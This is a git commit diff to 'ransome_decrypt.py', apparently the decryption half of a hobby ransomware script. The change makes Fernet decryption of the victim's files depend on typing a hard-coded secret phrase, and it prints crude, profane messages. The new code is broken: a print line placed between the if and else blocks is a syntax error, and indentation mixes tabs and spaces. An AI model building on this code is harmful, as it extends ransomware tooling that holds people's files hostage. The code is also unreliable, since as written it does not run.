e60837a571646a462b9c76ced548788e1eefc5fa
@networkchaos <65135432+networkchaos@users.noreply.github.com>
2023-01-10 17:30:27 +0300

    Update ransome_decrypt.py

--- ransome_decrypt.py
+++ ransome_decrypt.py
@@ -19,10 +19,17 @@ print(files)
 
 with open("thekey.key", "rb") as key:
 	secretkey = key.read()
+	
+secretphrase = "coffee"
+user_phrase = input("Enter the secret phrase to decrept you files\n")
 
-for file in files:
-        with open(file, "rb") as thefile:
-                contents = thefile.read()
-        contents_decrypted = Fernet(secretkey).decrypt(contents)
-        with open(file, "wb") as thefile:
-                thefile.write(contents_decrypted)
+if user_phrase == secretphrase:
+	for file in files:
+        	with open(file, "rb") as thefile:
+                	contents = thefile.read()
+        	contents_decrypted = Fernet(secretkey).decrypt(contents)
+        	with open(file, "wb") as thefile:
+                	thefile.write(contents_decrypted)			
+print("CONGRATZ UR IN HEHEHE!!!!!")
+else:
+	print("FUCK OFF MATE ENTER THE FUCKING PHRASE CORRECTLY")
